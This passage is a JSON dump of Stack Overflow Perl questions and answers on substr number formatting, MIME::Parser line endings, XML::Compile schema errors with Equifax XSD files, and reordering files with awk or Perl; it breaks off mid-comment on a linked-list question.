[{"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 9263601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55261f1008bd13137f7061e561e0b179?s=128&d=identicon&r=PG&f=1", "display_name": "user380892", "link": "https://stackoverflow.com/users/9263601/user380892"}, "edited": false, "score": 0, "creation_date": 1521072099, "post_id": 49289456, "comment_id": 85582170, "body": "That makes sense. What about the part where -1 is being multiplied by the length?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1521072250, "post_id": 49289456, "comment_id": 85582198, "body": "Note that <code>substr( $x, $i, 0 ) = &#39;,&#39;</code> is the same as <code>substr( $x, $i, 0, &#39;,&#39; )</code>"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 3, "last_activity_date": 1521072126, "last_edit_date": 1521072126, "creation_date": 1521071845, "answer_id": 49289456, "question_id": 49289374, "link": "https://stackoverflow.com/questions/49289374/number-formatting-with-substr/49289456#49289456", "title": "Number formatting with substr", "body": "<p>Print the value of <code>$i</code> to see what's going on:</p>\n\n<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nmy $x = 1234567890;\n\nfor (my $i = -3; $i &gt; -1 * length $x; $i -= 4) {\n    substr( $x, $i, 0 ) = ',';\n    print \"($i)&lt;$x&gt;\\n\";\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>(-3)&lt;1234567,890&gt;\n(-7)&lt;1234,567,890&gt;\n(-11)&lt;1,234,567,890&gt;\n</code></pre>\n\n<p>Negative position in <code>substr</code> means \"count from the right\". Specifying length 0 means we're <em>inserting</em> a substring. We're adding commas before each group of 3 digits from the right, but we need to change the position by -4 because we need to jump over the comma added in the previous step.</p>\n"}], "owner": {"reputation": 17, "user_id": 9263601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55261f1008bd13137f7061e561e0b179?s=128&d=identicon&r=PG&f=1", "display_name": "user380892", "link": "https://stackoverflow.com/users/9263601/user380892"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "accepted_answer_id": 49289456, "answer_count": 1, "score": 0, "last_activity_date": 1521072126, "creation_date": 1521071202, "question_id": 49289374, "link": "https://stackoverflow.com/questions/49289374/number-formatting-with-substr", "title": "Number formatting with substr", "body": "<p>Can anyone explain the logic behind what is happening in this code? I know what its purpose is, but not exactly how it works. </p>\n\n<pre><code>for ( my $i = -3; $i &gt; -1 * length($x); $i -= 4 )\n{\nsubstr( $x, $i, 0 ) = ',';\nprint $x;\n}\n</code></pre>\n"}, {"tags": ["perl", "mime"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1521061087, "post_id": 49287469, "comment_id": 85577993, "body": "Are you on a Windows system? If so, try <code>binmode F;</code> before reading from the file to disable the default <code>:crlf</code> layer that Perl uses on Windows. See <a href=\"http://perldoc.perl.org/PerlIO.html\" rel=\"nofollow noreferrer\"><code>PerlIO</code></a> and <a href=\"http://perldoc.perl.org/functions/open.html\" rel=\"nofollow noreferrer\"><code>open</code></a>."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1521061199, "post_id": 49287469, "comment_id": 85578054, "body": "It&#39;s also better to use the three-argument <a href=\"http://perldoc.perl.org/functions/open.html\" rel=\"nofollow noreferrer\"><code>open</code></a>, lexical filehandles, and especially error checking: <code>open my $fh, &#39;&lt;&#39;, &#39;myfile.txt&#39; or die $!;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": -1, "last_activity_date": 1521061812, "creation_date": 1521061812, "answer_id": 49287677, "question_id": 49287469, "link": "https://stackoverflow.com/questions/49287469/perl-mimetools-crlf-changed-to-lf/49287677#49287677", "title": "Perl MIME::Tools - CRLF changed to LF", "body": "<p>Your question is missing the important information of how the data look like which you decode. But I will assume that these either have the explicitly given content-type of <code>text/plain</code> or have this content-type implicitly (i.e. no content-type header given). <code>text/plain</code> means ASCII data (unless a <code>charset</code> header is defined) and line ends will be used specific to the environment where the data are extracted: this means CRLF on Windows and LF on Linux, MacOS and other UNIX or UNIX like systems. It does not matter what the original line endiing inside the mail was, all what matters is the line ending used in the target environment.</p>\n\n<p>If you really want to have the original line ending then the content should be declared as binary (i.e. content-type <code>application/octet-stream</code> or similar, but definitely no <code>text/*</code>) and the data need to be encoded with an content-transfer-encoding suitable for binary data, i.e. base64.</p>\n"}], "owner": {"reputation": 8001, "user_id": 307297, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/e28FD.png?s=128&g=1", "display_name": "chris01", "link": "https://stackoverflow.com/users/307297/chris01"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 92, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1521061812, "creation_date": 1521060931, "question_id": 49287469, "link": "https://stackoverflow.com/questions/49287469/perl-mimetools-crlf-changed-to-lf", "title": "Perl MIME::Tools - CRLF changed to LF", "body": "<p>I parse a multipart MIME with MIME::Parse. I wanna have the complete part, not only head or body. As far I see it changes CRLF to LF. Thats a problem.</p>\n\n<pre><code>use MIME::Parser;\n\nmy $parser = new MIME::Parser ();\n$parser-&gt;decode_headers (0);\n$parser-&gt;decode_bodies (0);\n$parser-&gt;output_to_core (1);\n\nopen (F, \"myfile.txt\");\nmy $mime = $parser-&gt;parse (\\*F);\nclose (F);\n\nmy $mp = $mime-&gt;parts (0);  // get the 1st part\n\nmy $ct = $mp-&gt;as_string (); \n\nmy $h = unpack (\"H*\", $ct);\n$h = join (' ', $h =~ /(..)/g); \nprint \"\\n$h\\n\";            // inspect and compare with myfile.txt in a hex-editor\n</code></pre>\n\n<p>If I look into myfile.txt with a hex-editor line-separators are CRLFs (0x0d 0x0a).\nIf I check the print-output then they changed to LFs (0x0a).</p>\n\n<p>Why is that? How can I get the original content?</p>\n\n<p>Thanks!\nChris</p>\n"}, {"tags": ["xml", "perl", "xsd"], "answers": [{"comments": [{"owner": {"reputation": 79, "user_id": 1030489, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fa2d79da8fac1c2027ebaaa350b38d7f?s=128&d=identicon&r=PG", "display_name": "user1030489", "link": "https://stackoverflow.com/users/1030489/user1030489"}, "edited": false, "score": 0, "creation_date": 1521139851, "post_id": 49287899, "comment_id": 85616341, "body": "This works perfectly.  I really appreciate the assistance."}], "tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": true, "score": 1, "last_activity_date": 1521062865, "creation_date": 1521062865, "answer_id": 49287899, "question_id": 49287276, "link": "https://stackoverflow.com/questions/49287276/xmlcompileschema-error-with-xsd-files/49287899#49287899", "title": "XML::Compile::Schema Error with XSD Files", "body": "<p>I'm not an expert on <a href=\"https://metacpan.org/pod/distribution/XML-Compile/lib/XML/Compile.pod\" rel=\"nofollow noreferrer\"><code>XML::Compile</code></a>, so I can't tell you if the following is the best solution. I did make the same observation that <code>CNConsAndCommRequestType.xsd</code> does not have a <code>targetNamespace</code> set, but <a href=\"https://metacpan.org/pod/XML::Compile::Schema\" rel=\"nofollow noreferrer\"><code>XML::Compile::Schema</code></a> allows us to override that. This appears to work for me (I downloaded the <code>xsd</code>s locally):</p>\n\n<pre><code>use warnings;\nuse strict;\nuse XML::Compile::Schema;\nuse XML::Compile::Util qw/pack_type/;\n\nmy $schema = XML::Compile::Schema-&gt;new( schema_dirs=&gt;[ '/path/to/xsds' ] );\n$schema-&gt;importDefinitions($_) for qw/ CNCustTransmitToEfx.xsd\n    CNConsAndCommRequestSegTypes.xsd CNEfxCommon.xsd /;\n$schema-&gt;importDefinitions('CNConsAndCommRequestType.xsd',\n    target_namespace =&gt; 'http://www.equifax.ca/XMLSchemas/CustToEfx');\nmy $type = pack_type('http://www.equifax.ca/XMLSchemas/CustToEfx',\n    'CNCustTransmitToEfx');\nprint $schema-&gt;template(PERL =&gt; $type);\n</code></pre>\n"}], "owner": {"reputation": 79, "user_id": 1030489, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fa2d79da8fac1c2027ebaaa350b38d7f?s=128&d=identicon&r=PG", "display_name": "user1030489", "link": "https://stackoverflow.com/users/1030489/user1030489"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 242, "favorite_count": 1, "accepted_answer_id": 49287899, "answer_count": 1, "score": 1, "last_activity_date": 1521062865, "creation_date": 1521060100, "question_id": 49287276, "link": "https://stackoverflow.com/questions/49287276/xmlcompileschema-error-with-xsd-files", "title": "XML::Compile::Schema Error with XSD Files", "body": "<p>I'm looking to use a Perl module to leverage some publicly available xsd files as a template to perform credit check lookups.</p>\n\n<p>XSD files are here: <a href=\"http://www.equifax.ca/XMLSchemas/UAT/\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/UAT/</a></p>\n\n<p>Documentation snippet:</p>\n\n<blockquote>\n  <p>The Equifax Namespace for the \u201cInput Request for Consumer and Commercial\u201d is:</p>\n  \n  <ul>\n  <li>\u201c<a href=\"http://www.equifax.ca/XMLSchemas/CustToEfx\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/CustToEfx</a>\u201d for both Production environment and User Acceptance Test environment also known as SS\n  environment at Equifax.</li>\n  </ul>\n  \n  <p>The Equifax \u201cInput Request for Consumer and Commercial\u201d Namespace Schema Location is:</p>\n  \n  <ul>\n  <li>For the Production environment.</li>\n  </ul>\n  \n  <p><a href=\"http://www.equifax.ca/XMLSchemas/Production/CNCustTransmitToEfx.xsd\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/Production/CNCustTransmitToEfx.xsd</a></p>\n  \n  <ul>\n  <li>For the User Acceptance Test environment also known as SS environment at Equifax.</li>\n  </ul>\n  \n  <p><a href=\"http://www.equifax.ca/XMLSchemas/UAT/CNCustTransmitToEfx.xsd\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/UAT/CNCustTransmitToEfx.xsd</a></p>\n</blockquote>\n\n<p>Documentation for XML::Compile::Schema: <a href=\"http://search.cpan.org/~markov/XML-Compile-1.59/lib/XML/Compile/Schema.pod\" rel=\"nofollow noreferrer\">http://search.cpan.org/~markov/XML-Compile-1.59/lib/XML/Compile/Schema.pod</a></p>\n\n<p>The problem I am having is that I am unable to ingest the xsd files properly and use $schema->template('PERL', $type) to display the xsd template.</p>\n\n<h2>First attempt:</h2>\n\n<p>(following <a href=\"http://blogs.perl.org/users/brian_e_lozier/2011/10/using-xmlcompile-to-output-xsd-compliant-xml.html\" rel=\"nofollow noreferrer\">http://blogs.perl.org/users/brian_e_lozier/2011/10/using-xmlcompile-to-output-xsd-compliant-xml.html</a>)</p>\n\n<p>Example code from link above:</p>\n\n<pre><code>#!/usr/local/bin/perl\n\nuse warnings;\nuse strict;\n\nuse Data::Dumper;\nuse XML::Compile::Schema;\nuse XML::LibXML::Reader;\n\nmy $xsd = 'test.xsd';\n\nmy $schema = XML::Compile::Schema-&gt;new($xsd);\n\n# This will print a very basic description of what the schema describes\n$schema-&gt;printIndex();\n\n# this will print a hash template that will show you how to construct a \n# hash that will be used to construct a valid XML file.\n#\n# Note: the second argument must match the root-level element of the XML \n# document.  I'm not quite sure why it's required here.\nwarn $schema-&gt;template('PERL', 'addresses');\n</code></pre>\n\n<p>My attempt:</p>\n\n<pre><code>use Data::Dumper;\nuse XML::Compile::Schema;\nuse XML::LibXML::Reader;\n\nmy $xsd = '/tmp/CNCustTransmitToEfx.xsd';\n\nmy $schema = XML::Compile::Schema-&gt;new($xsd);\n\nwarn $schema-&gt;template('PERL', 'CNCustTransmitToEfx');\n</code></pre>\n\n<p>Returns: error: cannot find element or attribute `CNCustTransmitToEfx'</p>\n\n<p>$schema->printIndex(); returns something that looks good though: <a href=\"https://pastebin.com/rkED54eV\" rel=\"nofollow noreferrer\">https://pastebin.com/rkED54eV</a></p>\n\n<h2>Second attempt:</h2>\n\n<p>Fixing previous error from: <a href=\"https://stackoverflow.com/questions/23687368/xmlcompile-does-not-find-the-root-element-i-give-it?rq=1\">XML::Compile does not find the root element I give it</a></p>\n\n<p>(Using pack_type to change $type to {[namespace]}CNCustTransmitToEfx)</p>\n\n<pre><code>use XML::Compile::Schema;\nuse XML::Compile::Util qw/pack_type/;\n\nmy $schema = XML::Compile::Schema-&gt;new(\"/tmp/CNCustTransmitToEfx.xsd\");\nmy $type = pack_type 'http://www.equifax.ca/XMLSchemas/CustToEfx', 'CNCustTransmitToEfx';\nwarn $schema-&gt;template('PERL' =&gt; $type);\n</code></pre>\n\n<p>Returns: \"error: cannot find type {<a href=\"http://www.equifax.ca/XMLSchemas/CustToEfx\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/CustToEfx</a>}CNConsAndCommRequestType at {<a href=\"http://www.equifax.ca/XMLSchemas/CustToEfx\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/CustToEfx</a>}CNCustTransmitToEfx\"</p>\n\n<p>I cannot find any targetNamespace in the 'CNConsAndCommRequestType' xsd file, not sure if this is the problem or not:  <a href=\"http://www.equifax.ca/XMLSchemas/UAT/CNConsAndCommRequestType.xsd\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/UAT/CNConsAndCommRequestType.xsd</a></p>\n\n<h2>Third attempt: Adding all XSD files locally first</h2>\n\n<pre><code>my $xsds = ['/tmp/CNConsAndCommRequestType.xsd','/tmp/CNCustTransmitToEfx.xsd','/tmp/CNEfxCommon.xsd','/tmp/CNConsAndCommRequestSegTypes.xsd','/tmp/BDC-CNEfxReportType.xsd', '/tmp/BDC-CNEfxTransmitToCust.xsd', '/tmp/CNCommCreditSegTypesReport2.0.xsd', '/tmp/CNCommCreditSegTypes.xsd', '/tmp/CNCommCreditTypeReport2.0.xsd','/tmp/CNCommCreditType.xsd', '/tmp/CNConsCreditSegTypes.xsd', '/tmp/CNConsCreditType.xsd', '/tmp/CNEfxReportType.xsd', '/tmp/CNEfxTransmitToCust.xsd'];\nmy $schema = XML::Compile::Cache-&gt;new($xsds);\n\nmy $type = pack_type 'http://www.equifax.ca/XMLSchemas/CustToEfx', 'CNCustTransmitToEfx';\nwarn $schema-&gt;template('PERL' =&gt; $type);\n</code></pre>\n\n<p>Returns same error: \"error: cannot find type {<a href=\"http://www.equifax.ca/XMLSchemas/CustToEfx\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/CustToEfx</a>}CNConsAndCommRequestType at {<a href=\"http://www.equifax.ca/XMLSchemas/CustToEfx\" rel=\"nofollow noreferrer\">http://www.equifax.ca/XMLSchemas/CustToEfx</a>}CNCustTransmitToEfx\"</p>\n\n<p>I'm having a really hard time figuring out if this is something wrong with the schema, or something that I'm doing wrong.  </p>\n\n<p>Any input is appreciated.</p>\n"}, {"tags": ["perl", "unix", "awk", "grep"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1521062679, "post_id": 49286897, "comment_id": 85578785, "body": "1) Is <code>&gt;ENT02 xyxyxyxyxyxy</code> in the &quot;<i>expected output</i>&quot; for File1 a typo? The last <code>y</code> shouldn&#39;t be there? 2) So what do you want to do when an entry in File3 does not exist in File 1/2?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1521071545, "post_id": 49286897, "comment_id": 85581994, "body": "It sounds like the two columns in <code>File 3</code> are independent, and could actually be in two different files. The file simply specifies an ordering of the records from <code>File 1</code> and <code>File 2</code>. Is that right?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1521071778, "post_id": 49286897, "comment_id": 85582078, "body": "Do you really want <code>some info</code> substituted where there is no information for an ID in the main files. For instance, there is no entry for <code>&gt;ENG78</code>, but your required output shows <code>&gt;ENG78 some info</code>."}], "answers": [{"comments": [{"owner": {"reputation": 65, "user_id": 8345845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b10f919bb49e42ce2c082310fc4f6b70?s=128&d=identicon&r=PG&f=1", "display_name": "user210432", "link": "https://stackoverflow.com/users/8345845/user210432"}, "edited": false, "score": 0, "creation_date": 1521061652, "post_id": 49287249, "comment_id": 85578277, "body": "Thank you for your response. However, just running the above code with the example files, the output I get is different from your output file1.new looks like <code>&gt;ENT01 &gt;ENG78\tsome info &gt;ENT02 &gt;ENG098\tsome info &gt;ENT02 &gt;ENG012\tsome info &gt;ENT02 &gt;ENG234\tsome info &gt;ENT03 &gt;ENG012\tsome info</code> sorry I am not able to format the comment.  I have three columns in file1.new where the first two columns are from file3 and third column has &#39;some info&#39;"}, {"owner": {"reputation": 65, "user_id": 8345845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b10f919bb49e42ce2c082310fc4f6b70?s=128&d=identicon&r=PG&f=1", "display_name": "user210432", "link": "https://stackoverflow.com/users/8345845/user210432"}, "edited": false, "score": 0, "creation_date": 1521154209, "post_id": 49287249, "comment_id": 85622954, "body": "Yes. They are tab separated. I am sorry for the delay in responding."}, {"owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "reply_to_user": {"reputation": 65, "user_id": 8345845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b10f919bb49e42ce2c082310fc4f6b70?s=128&d=identicon&r=PG&f=1", "display_name": "user210432", "link": "https://stackoverflow.com/users/8345845/user210432"}, "edited": false, "score": 0, "creation_date": 1521157510, "post_id": 49287249, "comment_id": 85623979, "body": "Well, that&#39;s what <code>-F&#39;\\t&#39;</code> and <code>-v OFS=&#39;\\t&#39;</code> are for. Did you use them?"}], "tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": false, "score": 1, "last_activity_date": 1521059978, "creation_date": 1521059978, "answer_id": 49287249, "question_id": 49286897, "link": "https://stackoverflow.com/questions/49286897/generating-2-files-based-on-two-columns-in-a-third-file/49287249#49287249", "title": "Generating 2 files based on two columns in a third file", "body": "<p>You need to read and remember the first 2 files into some data structure, and then for the third file, output to 2 new files:</p>\n\n<pre><code>$ awk -F'\\t' -v OFS='\\t' '\n      FNR == 1 {file_num++}\n      file_num == 1 || file_num == 2 {data[file_num,$1] = $2; next}\n      function value(str) {\n          return str ? str : \"some info\"\n      }\n      {\n          for (i=1; i&lt;=2; i++) {\n              print $i, value(data[i,$i]) &gt; ARGV[i] \".new\"\n          }\n      }\n  ' file1 file2 file3\n\n\n$ cat file1.new\n&gt;ENT01  xxxxxxxxxxxxxx\n&gt;ENT02  xyxyxyxyxyxy\n&gt;ENT02  xyxyxyxyxyxy\n&gt;ENT02  xyxyxyxyxyxy\n&gt;ENT03  ththththththt\n\n$ cat file2.new\n&gt;ENG78  some info\n&gt;ENG098 ksksksksksks\n&gt;ENG012 ggggggggggggg\n&gt;ENG234 wewewewewew\n&gt;ENG012 ggggggggggggg\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1521093394, "post_id": 49288086, "comment_id": 85587395, "body": "@user210432  Edited answer to add <code>&#39;some info&#39;</code> for the missing identifiers.  Please clarify a few points, by responding to comments below the question."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1521702201, "post_id": 49288086, "comment_id": 85845618, "body": "@user210432 Edited the answer to make it more concise and demonstrate a few useful things"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1522385528, "last_edit_date": 1522385528, "creation_date": 1521063777, "answer_id": 49288086, "question_id": 49286897, "link": "https://stackoverflow.com/questions/49286897/generating-2-files-based-on-two-columns-in-a-third-file/49288086#49288086", "title": "Generating 2 files based on two columns in a third file", "body": "<p>The files 1 and 2 first need be read so that you can find their lines with identifiers from file 3. Since the identifiers in these files are unique you can build a hash for each file, with identifiers as keys. </p>\n\n<p>Then process file 3 line by line, where for each identifier on the line retrieve its value from the hash for the appropriate file and write the corresponding lines to new files 1 and 2.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\nuse Path::Tiny;\n\nmy ($file1, $file2, $file3) = qw(File1.txt File2.txt File3.txt);\n\nmy ($fileout1, $fileout2) = map { $_ . 'new' } ($file1, $file2);\n\nmy %file1 = map { split } path($file1)-&gt;lines;\nmy %file2 = map { split } path($file2)-&gt;lines;\n\nmy ($ofh1, $ofh2) = map { path($_)-&gt;openw } ($fileout1, $fileout2);\n\nopen my $fh, '&lt;', $file3 or die \"Can't open $file3: $!\";\n\nwhile (&lt;$fh&gt;) {\n    my ($f1, $f2) = split;\n\n    say $ofh1 \"$f1\\t\", $file1{$f1} // 'some info';   #/ see text\n    say $ofh2 \"$f2\\t\", $file2{$f2} // 'some info';\n}\nclose $_ for $ofh1, $ofh2, $fh;\n</code></pre>\n\n<p>This produces the correct output based on fragments of input files that are provided.</p>\n\n<p>I use <a href=\"http://search.cpan.org/~dagolden/Path-Tiny-0.104/lib/Path/Tiny.pm\" rel=\"nofollow noreferrer\">Path::Tiny</a> here for its conciseness. Its <code>lines</code> method returns all lines, and in <a href=\"http://perldoc.perl.org/functions/map.html\" rel=\"nofollow noreferrer\">map</a>'s block each is <a href=\"https://perldoc.perl.org/functions/split.html\" rel=\"nofollow noreferrer\">split</a> by default space. The list of such pairs returned by <code>map</code> is assigned to a hash, whereby each pair of successive strings forms a key-value pair.  </p>\n\n<p>Multiple files can be opened in one statement, and <code>Path::Tiny</code> again makes it clean with <code>openw</code>.  Its methods throw the exception (<code>die</code>) on errors, so we get error checking as well.</p>\n\n<p>If an identifier in File 3 is not found in File 1/2 I bluntly use <code>'some info'</code> as stated in the question,<sup>&dagger;</sup> but I expect that there is a more rounded solution for such a case.  Then the laconic <code>//</code> should be changed to accommodate extra processing (or call a sub in place of <code>'some info'</code> string). </p>\n\n<p>It is assumed that files 1 and 2 always have two entries on a line.</p>\n\n<p>Some shortcuts are taken, like reading each file into a hash in one line. Please expand the code as appropriate, with whatever checks may be needed.</p>\n\n<hr>\n\n<p><sup>&dagger;</sup> In such a case <code>$file1{$f1}</code> is <code>undef</code> so <code>//</code> (defined-or) operator returns its right-hand-side argument. A \"proper\" way is to test <code>if (exist $file1{$f1})</code> but <code>//</code> works as well.</p>\n"}], "owner": {"reputation": 65, "user_id": 8345845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b10f919bb49e42ce2c082310fc4f6b70?s=128&d=identicon&r=PG&f=1", "display_name": "user210432", "link": "https://stackoverflow.com/users/8345845/user210432"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1522385528, "creation_date": 1521058456, "last_edit_date": 1521058828, "question_id": 49286897, "link": "https://stackoverflow.com/questions/49286897/generating-2-files-based-on-two-columns-in-a-third-file", "title": "Generating 2 files based on two columns in a third file", "body": "<p>I am trying to prepare two input files based on information in a third file. File 1 is for sample1 and File 2 is for sample2. Both these files have lines with tab delimited columns. The first column contains unique identifier and the second column contains information. </p>\n\n<p>File 1</p>\n\n<pre><code>&gt;ENT01 xxxxxxxxxxxxxx\n&gt;ENT02 xyxyxyxyxyxy\n&gt;ENT03 ththththththt\n</code></pre>\n\n<p>..so on. Similarly, File 2 contains</p>\n\n<pre><code>&gt;ENG012 ggggggggggggg\n&gt;ENG098 ksksksksksks\n&gt;ENG234 wewewewewew\n</code></pre>\n\n<p>I have a File 3 that contains two columns each corresponding to the identifier from File 1 and File 2</p>\n\n<pre><code>&gt;ENT01 &gt;ENG78\n&gt;ENT02 &gt;ENG098\n&gt;ENT02 &gt;ENG012\n&gt;ENT02 &gt;ENG234\n&gt;ENT03 &gt;ENG012\n</code></pre>\n\n<p>and so on. I want to prepare input files for File 1 and File 2 by following the order in file 3. If an entry is repeated in file 3 (ex ENT02) I want to repeat the information for that entry. The expected output is\nFor File 1:</p>\n\n<pre><code>&gt;ENT01 xxxxxxxxxx\n&gt;ENT02 xyxyxyxyxyxy\n&gt;ENT02 xyxyxyxyxyx\n&gt;ENT02 xyxyxyxyxyx\n&gt;ENT03 ththththththth\n</code></pre>\n\n<p>And for file 2</p>\n\n<pre><code>&gt;ENG78 some info\n&gt;ENG098 ksksksksks\n&gt;ENG012 gggggggg\n&gt;ENG234 wewewewewew\n&gt;ENG012 gggggggg\n</code></pre>\n\n<p>All the the entries in file 1 and file 2 are unique but not in file 3. Also, there are some entries in file3 in either column that is not present in either file 1 or file 2. The current logic I am using is that finding an intersection  of identifiers from column 1 in both files1&amp;2 with respective columns in file 3, storing this as a list and using this list to compare with File1 and File 2 separately to generate output for File 1 &amp; 2. I am working with the following lines</p>\n\n<p><code>awk 'FNR==NR{a[$1]=$0;next};{print a[$1]}' file1 intersectlist</code> </p>\n\n<p><code>grep -v -x -f idsnotfoundinfile1 file3</code></p>\n\n<p>I am not able to get the right output as I think at some point it is getting sorted and only uniq values are printed out. Can someone please help me clear work this out. </p>\n"}, {"tags": ["perl", "linked-list"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1521061752, "post_id": 49285768, "comment_id": 85578332, "body": "<a href=\"https://pastebin.com/pfXquVW9\" rel=\"nofollow noreferrer\">This</a> is a variant that only translates the string it has too translate. It should be faster when in_order=false, but it might be a little slower when in_order=true."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1521069812, "post_id": 49285768, "comment_id": 85581498, "body": "What&#39;s the <code>eval</code> for? And why have you declared <code>my @t</code> instead of using <code>tr&#47;&#47;&#47;r</code>?"}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 0, "creation_date": 1521074666, "post_id": 49285768, "comment_id": 85582804, "body": "<code>eval</code> is for interpolating a variable into 